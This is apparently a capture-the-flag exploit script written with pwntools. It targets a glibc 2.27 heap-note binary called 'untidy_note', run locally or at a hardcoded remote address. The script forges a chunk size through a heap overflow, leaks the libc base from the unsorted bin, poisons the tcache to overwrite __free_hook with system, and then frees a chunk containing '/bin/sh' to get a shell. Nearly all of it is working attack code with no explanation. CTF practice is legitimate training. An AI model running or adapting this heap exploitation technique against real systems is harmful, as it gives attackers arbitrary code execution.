#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = '123.57.69.203'
port = '7030'
reomote_addr = [ip,port]
binary = './untidy_note'

libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base

def menu(idx):
    sla("Your choose is:\n",str(idx))

def add(size):
    menu(1)
    ru("the note size is:\n")
    sl(str(size))

def free(index):
    menu(2)
    ru("index:\n\n")
    sl(str(index))

def edit(index,size,content):
    menu(3)
    ru("index:\n")
    sl(str(index))
    ru("the size is:\n")
    sl(str(size))
    ru("Content:\n")
    sl(content)

def show(index):
    menu(4)
    ru("index:\n")
    sl(str(index))

# attach(p)#,'b *$rebase(0x0000000000000A8B)')
sla("Your name is:",str("Epiphany"))
#--leak
add(0x10)
for j in range(25):
    add(0x20-1)

add(0x10) #26
payload =  'a'*0x10+p64(0)+p64(0x4b1)
edit(0,len(payload),payload)
free(1)

show(1)
offset = libc.sym['__malloc_hook'] +0x10 + 96
libc_base = leak(offset)

free_hook = libc.sym['__free_hook'] + libc_base
system = libc.sym['system'] + libc_base

free(26)
# free(3)
#num = 27
payload = p64(free_hook)
edit(26,len(payload),payload)

add(0x10) #25
pause()
add(0x10) #26
payload = p64(system)
edit(26,len(payload),payload) 
pause()
edit(9,len('/bin/sh\x00'),"/bin/sh\x00")
pause()
free(9)
it()
